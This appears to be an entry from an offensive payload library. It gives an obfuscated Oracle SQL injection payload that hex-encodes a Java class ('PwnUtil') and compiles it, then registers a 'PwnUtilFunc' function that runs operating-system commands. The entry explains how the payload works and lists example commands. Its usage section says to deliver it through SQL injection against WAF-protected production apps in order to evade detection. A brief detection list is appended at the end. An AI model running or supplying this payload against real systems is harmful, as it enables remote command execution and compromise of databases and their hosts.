---
id: e179f044-0b38-49ee-b527-29340e45acc0
type: code
language: SQL
verified: true
created_at: '2023-04-06T03:56:35.343283+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tags:
  - oracle
  - java-class
  - rce
  - sql-injection
  - obfuscation
platforms:
  - Database
  - Oracle
validated: true
---

# Oracle-Create-Java-Class-Hex-Encoded-SQL

## Code

```sql
/* create Java class */
SELECT TO_CHAR(dbms_xmlquery.getxml('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e2a3b7075626c696320636c6173732070776e7574696c7b7075626c69632073746174696320537472696e672072756e28537472696e672061726773297b7472797b4275666665726564526561646572206d726561643d6e6577204275666665726564526561646572286e657720496e70757453747265616d5265616465722852756e74696d652e67657452756e74696d6528292e657865632861726773292e676574496e70757453747265616d282929293b20537472696e67207374656d702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e6528292920213d6e756c6c29207374722b3d7374656d702b225c6e223b206d726561642e636c6f736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b72657475726e20652e746f537472696e6728293b7d7d7d''));
EXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b'')); end;')) results FROM dual

/* run OS command */
SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;
```

## Description

This obfuscated SQL payload uses hex encoding (via HEXTORAW and UTL_RAW) to hide the Java class creation from filters, while DBMS_XMLQUERY and PRAGMA AUTONOMOUS_TRANSACTION enable execution in a SELECT context. It compiles the same 'PwnUtil' class as the direct variant, allowing OS command execution through the 'PwnUtilFunc' wrapper.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| p_cmd | OS command to execute post-deployment | 'ping -c 4 localhost' or 'type C:\Windows\win.ini' |

## Usage

Deliver via SQL injection in filtered environments (e.g., WAF-blocked apps). The hex strings decode at runtime to create the Java class and function. Post-injection, query PwnUtilFunc for command output. Useful for evading detection in production systems.

## Detection

- WAF logs for hex-encoded inputs or UTL_RAW/HEXTORAW usage.
- Database alerts for autonomous transactions in SELECT statements.
- Query ALL_OBJECTS for suspicious functions like PwnUtilFunc.
- Anomalous XMLQUERY calls in audit trails.

## Related

- [[procedures/Oracle-Java-Class-OS-Command-Execution]]
